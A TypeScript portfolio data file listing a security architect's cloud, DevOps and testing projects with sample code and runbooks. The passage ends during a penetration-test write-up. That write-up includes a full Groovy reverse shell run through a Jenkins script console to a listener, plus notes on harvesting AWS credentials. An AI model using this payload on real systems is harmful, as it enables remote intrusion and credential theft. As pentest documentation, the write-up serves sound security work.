import React, { useEffect, useMemo, useState } from 'react'

interface StrategicDocument {
  title: string
  content: string
}

interface TechnicalImplementation {
  fileName: string
  language: string
  code: string
}

interface OperationalMaterial {
  title: string
  content: string
}

interface Project {
  id: string
  category: string
  title: string
  description: string
  strategicDocs: StrategicDocument
  technicalImpl: TechnicalImplementation[]
  operationalMats: OperationalMaterial
}

interface PortfolioProfile {
  name: string
  title: string
  summary: string
}

interface PortfolioData {
  profile: PortfolioProfile
  projects: Project[]
}

const portfolioData: PortfolioData = {
  profile: {
    name: 'Samuel Jackson',
    title: 'Principal Cloud & Security Architect',
    summary:
      'A results-driven architect with over 15 years of experience designing, building, and securing enterprise-grade cloud platforms. Expert in blending infrastructure automation, DevOps methodologies, and robust security frameworks to deliver resilient, scalable, and secure systems. Proven leader in driving strategic initiatives from conception to production across multi-cloud environments.',
  },
  projects: [
    {
      id: 'p01',
      category: 'Cloud & Infrastructure',
      title: 'AWS Foundational Infrastructure (Terraform)',
      description:
        'Deployed a production-ready, multi-tier AWS network and compute infrastructure using Terraform. This foundational project established a secure, scalable, and repeatable baseline for all cloud workloads, incorporating best practices for VPC design, IAM, and resource tagging.',
      strategicDocs: {
        title: 'Architectural Decision Record: Terraform as Standard IaC',
        content: `**Status:** Accepted\n\n**Context:** The organization required a standardized, vendor-agnostic approach to provision cloud infrastructure to avoid configuration drift and enable GitOps workflows.\n\n**Decision:** We will adopt HashiCorp Terraform as the exclusive tool for infrastructure as code. All changes to cloud infrastructure must be managed through Terraform modules stored in a central Git repository.\n\n**Consequences:**\n- **Pros:** Unified workflow, state management, large community support, multi-cloud capability.\n- **Cons:** Learning curve for teams unfamiliar with HCL, requires state file management strategy.`,
      },
      technicalImpl: [
        {
          fileName: 'terraform/main.tf',
          language: 'hcl',
          code: `
terraform {
  required_version = ">= 1.2.0"
  required_providers {
    aws = {
      source  = "hashicorp/aws"
      version = "~> 5.0"
    }
  }
  backend "s3" {
    bucket         = "enterprise-terraform-state-lock"
    key            = "global/networking/terraform.tfstate"
    region         = "us-east-1"
    encrypt        = true
    dynamodb_table = "terraform-state-lock"
  }
}

provider "aws" {
  region = var.aws_region
  default_tags {
    tags = {
      Environment = var.environment
      ManagedBy   = "Terraform"
      Project     = "Foundational-AWS"
    }
  }
}
`,
        },
        {
          fileName: 'terraform/modules/vpc/main.tf',
          language: 'hcl',
          code: `
resource "aws_vpc" "main" {
  cidr_block           = var.vpc_cidr
  enable_dns_support   = true
  enable_dns_hostnames = true

  tags = {
    Name = "\${var.environment}-vpc"
  }
}

resource "aws_subnet" "public" {
  count                   = length(var.public_subnet_cidrs)
  vpc_id                  = aws_vpc.main.id
  cidr_block              = var.public_subnet_cidrs[count.index]
  availability_zone       = data.aws_availability_zones.available.names[count.index]
  map_public_ip_on_launch = true

  tags = {
    Name = "\${var.environment}-public-subnet-\${count.index + 1}"
  }
}

resource "aws_subnet" "private" {
  count                   = length(var.private_subnet_cidrs)
  vpc_id                  = aws_vpc.main.id
  cidr_block              = var.private_subnet_cidrs[count.index]
  availability_zone       = data.aws_availability_zones.available.names[count.index]

  tags = {
    Name = "\${var.environment}-private-subnet-\${count.index + 1}"
  }
}

resource "aws_internet_gateway" "main" {
  vpc_id = aws_vpc.main.id
  tags = {
    Name = "\${var.environment}-igw"
  }
}
`,
        },
      ],
      operationalMats: {
        title: 'Runbook: Deploying a New Environment with Terraform',
        content: `**Purpose:** To provision a new, isolated application environment (e.g., 'staging', 'uat').\n\n**Prerequisites:** AWS credentials configured, Terraform installed, approval for new environment costs.\n\n**Steps:**\n1.  **Clone Repository:** \`git clone git@github.com:org/infra-live.git\`\n2.  **Create New Workspace:** \`terraform workspace new <env_name>\`\n3.  **Create tfvars file:** Copy \`dev.tfvars\` to \`<env_name>.tfvars\`. Update CIDR ranges, domain names, and other environment-specific variables.\n4.  **Initialize Terraform:** \`terraform init\`\n5.  **Plan Deployment:** \`terraform plan -var-file="<env_name>.tfvars" -out="<env_name>.plan"\`\n6.  **Review Plan:** Carefully inspect the plan output for any unexpected changes. Require peer review and approval on the plan output via a pull request comment.\n7.  **Apply Deployment:** \`terraform apply "<env_name>.plan"\`\n\n**Rollback Procedure:**\n- For minor issues, fix the configuration and apply again.\n- For major issues, run \`terraform destroy -var-file="<env_name>.tfvars"\`. Investigate the root cause before attempting to redeploy.`,
      },
    },
    {
      id: 'p02',
      category: 'Cloud & Infrastructure',
      title: 'EKS Kubernetes Cluster Provisioning',
      description:
        'Automated the provisioning and configuration of production-grade Amazon EKS clusters using Terraform and Helm. The cluster includes essential add-ons for operations, such as the AWS Load Balancer Controller, Cluster Autoscaler for dynamic scaling, ExternalDNS for service discovery, and Cert-Manager for automated TLS certificate management.',
      strategicDocs: {
        title: 'ADR: Kubernetes as the Standard Container Orchestrator',
        content: `**Status:** Accepted\n\n**Context:** As our application landscape moves towards microservices, we need a robust, scalable, and standardized platform for container orchestration. Options considered were Amazon ECS, Docker Swarm, and self-managed Kubernetes.\n\n**Decision:** We will use Amazon EKS as our managed Kubernetes platform. This provides the power and flexibility of the Kubernetes API while offloading the complexity of managing the control plane to AWS.\n\n**Consequences:**\n- **Pros:** Cloud-native ecosystem leader, huge community, portable workloads, managed control plane reduces operational overhead.\n- **Cons:** High complexity, steep learning curve, can be costly if not managed efficiently.`,
      },
      technicalImpl: [
        {
          fileName: 'terraform/modules/eks/main.tf',
          language: 'hcl',
          code: `
module "eks" {
  source  = "terraform-aws-modules/eks/aws"
  version = "19.15.3"

  cluster_name    = "\${var.environment}-eks-cluster"
  cluster_version = "1.28"

  vpc_id     = var.vpc_id
  subnet_ids = var.private_subnet_ids

  eks_managed_node_groups = {
    general_purpose = {
      min_size     = 2
      max_size     = 10
      desired_size = 3
      instance_types = ["t3.large"]
    }
  }

  # Enable addons
  cluster_addons = {
    coredns    = {}
    kube-proxy = {}
    vpc-cni    = {}
  }

  tags = {
    Project = "EKS-Platform"
  }
}
`,
        },
        {
          fileName: 'helm/aws-load-balancer-controller.yaml',
          language: 'yaml',
          code: `
apiVersion: helm.toolkit.fluxcd.io/v2beta1
kind: HelmRelease
metadata:
  name: aws-load-balancer-controller
  namespace: kube-system
spec:
  interval: 5m
  chart:
    spec:
      chart: aws-load-balancer-controller
      version: '1.5.5'
      sourceRef:
        kind: HelmRepository
        name: eks-charts
        namespace: flux-system
  values:
    clusterName: \${cluster_name}
    serviceAccount:
      create: true
      name: aws-load-balancer-controller
    region: \${aws_region}
    vpcId: \${vpc_id}
`,
        },
      ],
      operationalMats: {
        title: 'Playbook: EKS Cluster Upgrade',
        content: `**Objective:** To upgrade an EKS cluster to a new Kubernetes version with minimal downtime.\n\n**Roles:**\n- **Lead:** DevOps Engineer\n- **Support:** SRE, Application Development Teams\n\n**Phases:**\n1.  **Planning (1-2 weeks prior):**\n    - Review Kubernetes changelog for deprecated APIs and breaking changes.\n    - Use tools like 'pluto' or 'kubent' to scan manifests for deprecated APIs.\n    - Notify application teams of the planned upgrade window.\n    - Perform the upgrade in a non-production environment first.\n2.  **Execution (Maintenance Window):**\n    - **Step 1: Control Plane Upgrade:** Update the \`cluster_version\` in Terraform and apply. Monitor the upgrade progress in the AWS console. This is a zero-downtime operation handled by AWS.\n    - **Step 2: Update Add-ons:** Update Helm chart versions for core components (CNI, CoreDNS, etc.) to versions compatible with the new Kubernetes release.\n    - **Step 3: Node Group Upgrade:** Create a new managed node group with the target Kubernetes version. Cordon and drain nodes in the old group one by one, allowing pods to reschedule onto the new nodes.\n    - **Step 4: Decommission Old Node Group:** Once all workloads are migrated, delete the old node group.\n3.  **Validation:**\n    - Run smoke tests and automated E2E tests against applications.\n    - Monitor Grafana dashboards for any increase in error rates or latency.`,
      },
    },
    {
      id: 'p03',
      category: 'Cloud & Infrastructure',
      title: 'Multi-Cloud Networking Architecture',
      description:
        'Designed and implemented a secure, high-performance network interconnection between AWS and Microsoft Azure. This project utilized AWS Transit Gateway and Azure Virtual WAN with a Site-to-Site VPN connection to enable seamless communication for a hybrid application, ensuring low latency and unified security controls.',
      strategicDocs: {
        title: 'Proposal: Multi-Cloud Strategy for Business Continuity',
        content: `**Objective:** To mitigate risks associated with vendor lock-in and to leverage best-of-breed services from multiple cloud providers (AWS for data analytics, Azure for Active Directory integration).\n\n**Proposed Solution:** Establish a secure and resilient network fabric connecting our AWS and Azure environments. This allows workloads to communicate securely across clouds, enabling scenarios like data replication for disaster recovery and hybrid application deployments.\n\n**High-Level Plan:**\n1.  Provision AWS Transit Gateway and Azure Virtual WAN.\n2.  Establish an IPsec VPN tunnel between the two gateways.\n3.  Configure routing and Network Security Groups / Security Groups to control traffic flow.\n4.  Implement DNS resolution across clouds.\n\n**Estimated Cost:** $1,500 / month (based on data transfer and gateway uptime).`,
      },
      technicalImpl: [
        {
          fileName: 'terraform/aws-transit-gateway.tf',
          language: 'hcl',
          code: `
resource "aws_ec2_transit_gateway" "main" {
  description                     = "TGW for multi-cloud connectivity"
  amazon_side_asn                 = 64512
  dns_support                     = "enable"
  vpn_ecmp_support                = "enable"
  default_route_table_association = "disable"
  default_route_table_propagation = "disable"

  tags = {
    Name = "tgw-to-azure"
  }
}

resource "aws_customer_gateway" "azure" {
  bgp_asn    = 65515 # Azure's ASN
  ip_address = azurerm_public_ip.vwan_vpn_gateway.ip_address
  type       = "ipsec.1"

  tags = {
    Name = "cgw-to-azure-vwan"
  }
}

resource "aws_vpn_connection" "to_azure" {
  customer_gateway_id = aws_customer_gateway.azure.id
  transit_gateway_id  = aws_ec2_transit_gateway.main.id
  type                = "ipsec.1"
  static_routes_only  = false
}
`,
        },
        {
          fileName: 'terraform/azure-vwan.tf',
          language: 'hcl',
          code: `
resource "azurerm_virtual_wan" "main" {
  name                = "main-vwan"
  resource_group_name = azurerm_resource_group.main.name
  location            = azurerm_resource_group.main.location
  type                = "Standard"
}

resource "azurerm_virtual_hub" "main" {
  name                = "main-vhub"
  resource_group_name = azurerm_resource_group.main.name
  location            = azurerm_resource_group.main.location
  virtual_wan_id      = azurerm_virtual_wan.main.id
  address_prefix      = "10.100.0.0/24"
}

resource "azurerm_vpn_gateway" "main" {
  name                = "vhub-vpngw"
  resource_group_name = azurerm_resource_group.main.name
  location            = azurerm_resource_group.main.location
  virtual_hub_id      = azurerm_virtual_hub.main.id
  bgp_settings {
    asn = 65515
  }
}
`,
        },
      ],
      operationalMats: {
        title: 'Runbook: Troubleshooting Multi-Cloud Connectivity',
        content: `**Symptom:** EC2 instances in AWS cannot reach VMs in Azure.\n\n**Triage Steps:**\n1.  **Check VPN Tunnel Status:** In the AWS console (VPC -> Site-to-Site VPN Connections) and Azure portal (Virtual WAN -> VPN sites), verify that the IPsec tunnels are 'UP'. If down, check phase 1 and phase 2 security associations.\n2.  **Verify BGP Peering:** Check the BGP routes on both the AWS VPN connection and the Azure VPN Gateway. Ensure routes are being advertised and received correctly.\n3.  **Check Security Groups / NSGs:** Confirm that the Security Group on the EC2 instance allows outbound traffic to the Azure VM's IP, and the NSG on the Azure VM allows inbound traffic from the EC2 instance's IP. Remember to check both stateful and stateless rules.\n4.  **Check Route Tables:** In both AWS and Azure, trace the path from the source subnet's route table to the destination. Ensure the next hop is correctly pointing to the Transit Gateway / Virtual Hub.\n5.  **Packet Capture:** Use \`tcpdump\` on the source/destination instances to see if packets are arriving.\n\n**Escalation:** If all checks pass, open a support ticket with both AWS and Azure, providing traceroute, MTR reports, and tunnel diagnostic logs.`,
      },
    },
    {
      id: 'p06',
      category: 'DevOps & CI/CD',
      title: 'Secure CI/CD Pipeline (GitLab CI)',
      description:
        'Engineered a comprehensive, security-first CI/CD pipeline using GitLab CI. This pipeline automates the build, test, scan, and deployment process, integrating Static Application Security Testing (SAST), Dynamic Application Security Testing (DAST), dependency scanning, and container vulnerability analysis directly into the developer workflow.',
      strategicDocs: {
        title: 'ADR: Shift-Left Security Strategy',
        content: `**Status:** Accepted\n\n**Context:** Security vulnerabilities discovered late in the development cycle are expensive and time-consuming to fix. A reactive security model creates friction and slows down delivery.\n\n**Decision:** We will implement a 'Shift-Left' security strategy by embedding automated security tools and checkpoints directly into our CI/CD pipelines. The goal is to provide developers with immediate feedback on security issues, making security a shared responsibility.\n\n**Consequences:**\n- **Pros:** Early vulnerability detection, reduced remediation costs, improved security posture, developer security awareness.\n- **Cons:** Can increase pipeline execution time, potential for false positives requires a tuning and exception process.`,
      },
      technicalImpl: [
        {
          fileName: '.gitlab-ci.yml',
          language: 'yaml',
          code: `
stages:
  - build
  - test
  - scan
  - deploy-staging
  - deploy-prod

variables:
  IMAGE_NAME: $CI_REGISTRY_IMAGE/$CI_COMMIT_REF_SLUG:$CI_COMMIT_SHA

# Use Kaniko to build container images without Docker-in-Docker
build-image:
  stage: build
  image:
    name: gcr.io/kaniko-project/executor:v1.9.0-debug
    entrypoint: [""]
  script:
    - /kaniko/executor
      --context $CI_PROJECT_DIR
      --dockerfile $CI_PROJECT_DIR/Dockerfile
      --destination $IMAGE_NAME

unit-tests:
  stage: test
  image: python:3.9
  script:
    - pip install -r requirements.txt
    - pytest --junitxml=report.xml
  artifacts:
    when: always
    reports:
      junit: report.xml

sast-scan:
  stage: scan
  image:
    name: "gcr.io/find-sec-bugs/find-sec-bugs:1.12.0" # Example SAST tool
  script:
    - /usr/bin/find-sec-bugs.sh -low -progress .
  allow_failure: false # Fail the pipeline on high-severity findings

dependency-scan:
  stage: scan
  image:
    name: "aquasec/trivy:latest"
  script:
    - trivy fs . --exit-code 1 --severity HIGH,CRITICAL
  allow_failure: false

container-scan:
  stage: scan
  image:
    name: "aquasec/trivy:latest"
  script:
    - trivy image --exit-code 1 --severity HIGH,CRITICAL $IMAGE_NAME
  needs: ["build-image"]
  allow_failure: false

deploy-to-staging:
  stage: deploy-staging
  image: curlimages/curl
  script:
    - echo "Deploying to Staging using ArgoCD..."
    # Trigger ArgoCD sync via API
    - curl -X POST -d '{"revision": "$CI_COMMIT_SHA"}' $ARGOCD_STAGING_WEBHOOK
  environment:
    name: staging
  when: on_success
  only:
    - main

deploy-to-prod:
  stage: deploy-prod
  image: curlimages/curl
  script:
    - echo "Deploying to Production using ArgoCD..."
    - curl -X POST -d '{"revision": "$CI_COMMIT_SHA"}' $ARGOCD_PROD_WEBHOOK
  environment:
    name: production
  when: manual # Manual approval required for production
  only:
    - main
`,
        },
      ],
      operationalMats: {
        title: 'Playbook: Handling a Critical Vulnerability in CI',
        content: `**Objective:** To triage and remediate a critical vulnerability discovered by an automated scanner in the CI/CD pipeline.\n\n**Roles:**\n- **First Responder:** Developer whose merge request triggered the failure.\n- **Security Champion:** Designated developer on the team with security training.\n- **AppSec Engineer:** Member of the central security team.\n\n**Process:**\n1.  **Notification:** GitLab automatically fails the pipeline and notifies the MR owner. A webhook also posts a message to the team's #security-alerts channel.\n2.  **Initial Triage (Developer & Security Champion):**\n    - **Validate:** Is this a real vulnerability or a false positive?\n    - **Assess Impact:** What is the potential impact if this code were to reach production?\n    - **Identify Fix:** Can the dependency be patched to a non-vulnerable version? Is there a code-level fix?\n3.  **Remediation Path:**\n    - **Path A (Simple Fix):** If a simple patch is available (e.g., \`npm update <package>\`), the developer applies the fix, pushes a new commit, and the pipeline re-runs.\n    - **Path B (Complex Fix / False Positive):** If the fix is non-trivial or it's a suspected false positive, the Security Champion creates a Jira ticket. They tag the AppSec team for consultation.\n4.  **Risk Acceptance (Temporary):**\n    - In rare, business-critical cases where a fix cannot be immediately applied, the Product Owner and an AppSec Engineer can approve a temporary exception. This is tracked in a risk register with a defined timeline for remediation.\n5.  **Resolution:** The Jira ticket is resolved once the vulnerability is patched or accepted. A brief post-mortem may be held to identify root causes.`,
      },
    },
    {
      id: 'p07',
      category: 'DevOps & CI/CD',
      title: 'GitOps with ArgoCD',
      description:
        'Implemented a declarative, GitOps-based continuous deployment workflow for Kubernetes applications using ArgoCD. This project established Git as the single source of truth for application configuration and cluster state, enabling automated, auditable, and easily revertible deployments.',
      strategicDocs: {
        title: 'ADR: Adopting GitOps for Kubernetes Deployments',
        content: `**Status:** Accepted\n\n**Context:** Traditional imperative deployment methods (e.g., \`kubectl apply\`, Helm CLI) are manual, error-prone, and lack a clear audit trail. This leads to configuration drift between environments and difficulty in recovering from bad deployments.\n\n**Decision:** We will adopt the GitOps methodology for all Kubernetes deployments, using ArgoCD as the GitOps agent. The desired state of our applications will be declared in a dedicated Git repository. ArgoCD will continuously reconcile the live cluster state with the state defined in Git.\n\n**Consequences:**\n- **Pros:** Declarative and automated deployments, improved security (no direct \`kubectl\` access needed), enhanced auditability and rollback capabilities, eliminates configuration drift.\n- **Cons:** Requires a new repository structure and workflow, initial setup complexity for ArgoCD.`,
      },
      technicalImpl: [
        {
          fileName: 'gitops-repo/apps/my-app/staging.yaml',
          language: 'yaml',
          code: `
apiVersion: argoproj.io/v1alpha1
kind: Application
metadata:
  name: my-app-staging
  namespace: argocd
  finalizers:
    - resources-finalizer.argocd.argoproj.io
spec:
  project: default
  source:
    repoURL: 'https://github.com/org/app-config.git'
    path: helm-charts/my-app
    targetRevision: main
    helm:
      valueFiles:
        - values-staging.yaml
  destination:
    server: 'https://kubernetes.default.svc'
    namespace: my-app-staging
  syncPolicy:
    automated:
      prune: true
      selfHeal: true
    syncOptions:
      - CreateNamespace=true
`,
        },
        {
          fileName: 'gitops-repo/helm-charts/my-app/values-staging.yaml',
          language: 'yaml',
          code: `
replicaCount: 2

image:
  repository: my-registry/my-app
  tag: "1.2.0-staging" # This tag would be updated by the CI pipeline
  pullPolicy: IfNotPresent

service:
  type: ClusterIP
  port: 80

ingress:
  enabled: true
  className: "nginx"
  annotations:
    cert-manager.io/cluster-issuer: "letsencrypt-staging"
  hosts:
    - host: my-app.staging.example.com
      paths:
        - path: /
          pathType: ImplementationSpecific

resources:
  limits:
    cpu: 200m
    memory: 256Mi
  requests:
    cpu: 100m
    memory: 128Mi

env:
  - name: DATABASE_URL
    valueFrom:
      secretKeyRef:
        name: my-app-staging-secrets
        key: database_url
`,
        },
      ],
      operationalMats: {
        title: 'Runbook: Rolling Back a Failed Deployment in ArgoCD',
        content: `**Symptom:** A new deployment has caused a spike in application errors (5xx) or high latency.\n\n**Immediate Action (5 minutes):**\n1.  **Open ArgoCD UI:** Navigate to the application's page in the ArgoCD web interface.\n2.  **Initiate Rollback:** Click the 'History and Rollback' button. Select the last known good revision (commit hash).\n3.  **Sync:** Click 'Sync' to apply the old configuration to the cluster. ArgoCD will revert the Kubernetes objects to their previous state.\n4.  **Verify:** Monitor Grafana dashboards and logs to confirm the application has returned to a healthy state.\n\n**Post-Rollback Analysis:**\n1.  **Freeze Deployments:** Pause automated sync for the affected application in ArgoCD to prevent the bad commit from being redeployed automatically.\n2.  **Investigate Root Cause:** Examine the commit that caused the failure. Check logs from the failing pods. Replicate the issue in a staging environment.\n3.  **Create Hotfix:** Once the root cause is identified, create a new commit with a fix.\n4.  **Deploy Hotfix:** Manually sync the hotfix commit in the ArgoCD UI for the staging environment first. After verification, re-enable automated sync and promote the fix to production.`,
      },
    },
    {
      id: 'p10',
      category: 'Software Development & QA',
      title: 'Polyglot Microservices Application',
      description:
        'Developed a distributed system composed of multiple microservices written in different languages (Python/FastAPI for data processing, Node.js/Express for the user-facing API). Services communicate asynchronously via a message queue (RabbitMQ) and synchronously via REST APIs, all containerized with Docker and deployed to Kubernetes.',
      strategicDocs: {
        title: 'ADR: Microservices Architecture Adoption',
        content: `**Status:** Accepted\n\n**Context:** Our monolithic application has become difficult to scale, maintain, and update. A single bug can bring down the entire system, and deployments are high-risk events.\n\n**Decision:** We will decompose the monolith into a set of independent, business-domain-aligned microservices. This allows teams to develop, deploy, and scale their services independently. We will allow teams to choose the best technology stack for their specific service (polyglot approach).\n\n**Consequences:**\n- **Pros:** Improved scalability, faster development cycles, technological flexibility, fault isolation.\n- **Cons:** Increased operational complexity (service discovery, distributed tracing, etc.), challenges in maintaining data consistency, requires significant investment in DevOps culture and tooling.`,
      },
      technicalImpl: [
        {
          fileName: 'services/data-processor/main.py',
          language: 'python',
          code: `
from fastapi import FastAPI
import pika
import json

app = FastAPI()

def process_message(ch, method, properties, body):
    data = json.loads(body)
    print(f" [x] Received task {data['task_id']}")
    # ... intensive data processing logic ...
    print(f" [x] Done with task {data['task_id']}")
    ch.basic_ack(delivery_tag=method.delivery_tag)

connection = pika.BlockingConnection(pika.ConnectionParameters('rabbitmq'))
channel = connection.channel()
channel.queue_declare(queue='task_queue', durable=True)
channel.basic_qos(prefetch_count=1)
channel.basic_consume(queue='task_queue', on_message_callback=process_message)

print(' [*] Waiting for messages. To exit press CTRL+C')
channel.start_consuming()
`,
        },
        {
          fileName: 'services/api-gateway/index.js',
          language: 'javascript',
          code: `
const express = require('express');
const amqp = require('amqplib/callback_api');
const { v4: uuidv4 } = require('uuid');

const app = express();
app.use(express.json());

let amqpChannel = null;
amqp.connect('amqp://rabbitmq', function(error0, connection) {
    if (error0) throw error0;
    connection.createChannel(function(error1, channel) {
        if (error1) throw error1;
        const queue = 'task_queue';
        channel.assertQueue(queue, { durable: true });
        amqpChannel = channel;
    });
});

app.post('/tasks', (req, res) => {
    if (!amqpChannel) {
        return res.status(503).send('Service not ready');
    }
    const taskId = uuidv4();
    const task = { task_id: taskId, payload: req.body };
    
    amqpChannel.sendToQueue(
        'task_queue', 
        Buffer.from(JSON.stringify(task)), 
        { persistent: true }
    );
    
    console.log(" [x] Sent task %s", taskId);
    res.status(202).json({ message: "Task accepted", taskId: taskId });
});

const PORT = 3000;
app.listen(PORT, () => {
    console.log(\`API Gateway listening on port \${PORT}\`);
});
`,
        },
      ],
      operationalMats: {
        title: 'Runbook: Debugging Inter-Service Communication',
        content: `**Symptom:** The API Gateway returns a 202 Accepted, but the task is never processed by the data-processor service.\n\n**Triage Steps:**\n1.  **Check RabbitMQ Management UI:** Access the RabbitMQ dashboard. Look at the 'task_queue'.\n    - **Scenario A: Messages are 'Ready' but not 'Unacked'.** This means messages are in the queue, but no consumer is picking them up. Check if the \`data-processor\` pod is running and healthy in Kubernetes. Check its logs for connection errors to RabbitMQ.\n    - **Scenario B: Messages are accumulating in 'Unacked'.** This means a consumer is stuck processing a message and hasn't acknowledged it. This could indicate a bug or infinite loop in the processing logic. Inspect the consumer logs for errors.\n    - **Scenario C: No messages in the queue.** This suggests the API Gateway is failing to publish messages. Check the gateway's logs for connection errors or publishing failures.\n2.  **Inspect Pod Logs:** Use \`kubectl logs -f <pod_name>\` for both the API Gateway and the data-processor to look for relevant error messages.\n3.  **Distributed Tracing:** If Jaeger or a similar tool is configured, find the trace for the failed request. This will show exactly which service the call failed at and provide detailed error information.\n4.  **Network Policies:** Ensure there isn't a Kubernetes NetworkPolicy blocking communication between the API Gateway pod and the RabbitMQ service on the required port (5672).`,
      },
    },
    {
      id: 'p11',
      category: 'Software Development & QA',
      title: 'End-to-End Testing Framework (Cypress)',
      description:
        'Established a robust, automated end-to-end (E2E) testing framework for a complex React single-page application using Cypress. This project enables full user-flow testing in a browser, catching regressions in the UI and integration points before they reach production. The test suite runs automatically in the CI/CD pipeline.',
      strategicDocs: {
        title: 'QA Strategy: The Testing Pyramid',
        content: `**Status:** Accepted\n\n**Context:** Our testing strategy has been overly reliant on manual QA, which is slow, expensive, and non-repeatable. We need to automate our testing efforts to increase quality and velocity.\n\n**Decision:** We will adopt the 'Testing Pyramid' model as our guiding strategy:\n- **Base (Unit Tests):** Fast, isolated tests for individual functions/components. These form the bulk of our tests.\n- **Middle (Integration Tests):** Test the interaction between several components or services.\n- **Top (End-to-End Tests):** A small number of high-value tests that simulate real user journeys through the application. These will be implemented using Cypress.\n\n**Consequences:** This structured approach ensures we get fast feedback where possible (unit tests) while still having confidence in the overall application functionality (E2E tests).`,
      },
      technicalImpl: [
        {
          fileName: 'cypress/e2e/login.cy.js',
          language: 'javascript',
          code: `
describe('Login Flow', () => {
  beforeEach(() => {
    // Intercept API calls to avoid hitting a real backend
    cy.intercept('POST', '/api/auth/login', {
      statusCode: 200,
      body: { token: 'fake-jwt-token' },
    }).as('loginRequest');

    cy.intercept('GET', '/api/user/profile', {
      statusCode: 200,
      fixture: 'profile.json',
    }).as('getProfile');

    cy.visit('/login');
  });

  it('should display an error for invalid credentials', () => {
    cy.intercept('POST', '/api/auth/login', {
      statusCode: 401,
      body: { error: 'Invalid credentials' },
    }).as('failedLogin');
    
    cy.get('[data-cy="email-input"]').type('wrong@example.com');
    cy.get('[data-cy="password-input"]').type('wrongpassword');
    cy.get('[data-cy="submit-button"]').click();

    cy.wait('@failedLogin');
    cy.get('[data-cy="error-message"]').should('be.visible').and('contain.text', 'Invalid credentials');
  });

  it('should allow a user to log in and redirect to the dashboard', () => {
    cy.get('[data-cy="email-input"]').type('test@example.com');
    cy.get('[data-cy="password-input"]').type('password123');
    cy.get('[data-cy="submit-button"]').click();

    cy.wait('@loginRequest');
    cy.wait('@getProfile');

    cy.url().should('include', '/dashboard');
    cy.get('h1').should('contain.text', 'Welcome, Test User');
  });
});
`,
        },
        {
          fileName: 'cypress.config.js',
          language: 'javascript',
          code: `
const { defineConfig } = require('cypress');

module.exports = defineConfig({
  e2e: {
    baseUrl: 'http://localhost:3000',
    viewportWidth: 1280,
    viewportHeight: 720,
    video: false, // Disable video recording for faster runs in CI
    screenshotOnRunFailure: true,
    setupNodeEvents(on, config) {
      // implement node event listeners here
    },
  },
  component: {
    devServer: {
      framework: 'react',
      bundler: 'webpack',
    },
  },
});
`,
        },
      ],
      operationalMats: {
        title: 'Runbook: Debugging Flaky Cypress Tests',
        content: `**Symptom:** A Cypress test passes consistently on local machines but fails intermittently in the CI pipeline.\n\n**Triage Steps:**\n1.  **Analyze CI Artifacts:** Download the screenshots and videos (if enabled) from the failed CI run. These often show exactly where the test failed. Look at the application state when it failed.\n2.  **Check for Race Conditions:** The most common cause of flakiness is a race condition. The test script is moving faster than the application. \n    - **Anti-Pattern:** Using arbitrary waits like \`cy.wait(500)\`. \n    - **Best Practice:** Wait for specific UI elements or API calls. For example, instead of waiting for a timer, wait for the loading spinner to disappear: \`cy.get('.spinner').should('not.exist')\`. Or wait for the data to load by waiting on an intercepted API call: \`cy.wait('@getData').then(() => { /* assertions */ });\`\n3.  **Increase Command Timeout:** If the CI runner is slow, a default timeout might not be enough. You can increase timeouts locally for a specific command: \`cy.get('.slow-element', { timeout: 10000 }).should('be.visible');\`\n4.  **Isolate the Test:** Run only the failing test file in the CI pipeline to get faster feedback. Use the \`--spec\` flag.\n5.  **Replicate Locally with Same Conditions:** Try to replicate the CI environment as much as possible. Use the same browser version and potentially a Docker container that mimics the CI runner.\n\n**Escalation:** If the test remains flaky, pair with another developer. Consider if the feature itself has a race condition that the test is exposing.`,
      },
    },

    {
      id: 'p14',
      category: 'Offensive Security',
      title: 'External Network Penetration Test',
      description:
        'Conducted a comprehensive black-box penetration test against a simulated corporate external network. The engagement involved reconnaissance, vulnerability scanning, manual exploitation of discovered services, and post-exploitation to demonstrate business impact. The final deliverable was a detailed report with actionable remediation advice.',
      strategicDocs: {
        title: 'Penetration Test - Rules of Engagement',
        content: `**Objective:** To identify and exploit vulnerabilities in the company's internet-facing infrastructure to assess the real-world risk of an external attack.\n\n**Scope:** The following IP ranges are in scope: \`198.51.100.0/24\`. Any systems outside this range are strictly out of scope.\n\n**Timeline:** The active testing window is from 2025-10-13 09:00 PST to 2025-10-17 17:00 PST.\n\n**Prohibited Actions:** Denial of Service (DoS) attacks, any action that could intentionally disrupt production services, modification or deletion of data.\n\n**Emergency Contact:** If a critical vulnerability is discovered that poses an immediate threat, testing will be paused, and the client point of contact will be notified immediately.`,
      },
      technicalImpl: [
        {
          fileName: 'reconnaissance.sh',
          language: 'bash',
          code: `
#!/bin/bash
TARGET_DOMAIN="example.com"
OUTPUT_DIR="recon_results"
mkdir -p $OUTPUT_DIR

echo "[*] Running Nmap scan on primary domain..."
nmap -sV -p- -T4 -oN $OUTPUT_DIR/nmap_scan.txt $TARGET_DOMAIN

echo "[*] Searching for subdomains with Subfinder..."
subfinder -d $TARGET_DOMAIN -o $OUTPUT_DIR/subdomains.txt

echo "[*] Probing subdomains for live web servers with httpx..."
cat $OUTPUT_DIR/subdomains.txt | httpx -o $OUTPUT_DIR/live_web_servers.txt

echo "[*] Taking screenshots of live web servers with gowitness..."
gowitness file -f $OUTPUT_DIR/live_web_servers.txt -P $OUTPUT_DIR/screenshots/

echo "[*] Reconnaissance complete. Results in $OUTPUT_DIR"
`,
        },
        {
          fileName: 'exploitation-notes.md',
          language: 'markdown',
          code: `
# Exploitation Path - Jenkins Server (198.51.100.32)

1.  **Discovery:** Nmap scan revealed an open port 8080 running Jenkins 2.150.
2.  **Vulnerability Identification:** Researched Jenkins 2.150 and found it is vulnerable to RCE via script console without authentication if security is not configured. (CVE-2018-1000861).
3.  **Exploitation:**
    * Navigated to \`http://198.51.100.32:8080/script\`.
    * Executed the following Groovy script to get a reverse shell:
        \`\`\`groovy
        String host="10.0.0.5";
        int port=4444;
        String cmd="/bin/bash";
        Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
        Socket s=new Socket(host,port);
        InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
        OutputStream po=p.getOutputStream(),so=s.getOutputStream();
        while(!s.isClosed()){
            while(pi.available()>0)so.write(pi.read());
            while(pe.available()>0)so.write(pe.read());
            while(si.available()>0)po.write(si.read());
            so.flush();
            po.flush();
            Thread.sleep(50);
            try {
                p.exitValue();
                break;
            }catch (Exception e){}
        };
        p.destroy();
        s.close();
        \`\`\`
4.  **Post-Exploitation:**
    * Listener on \`10.0.0.5:4444\` received a shell as the 'jenkins' user.
    * Found AWS credentials in \`~/.aws/credentials\`.
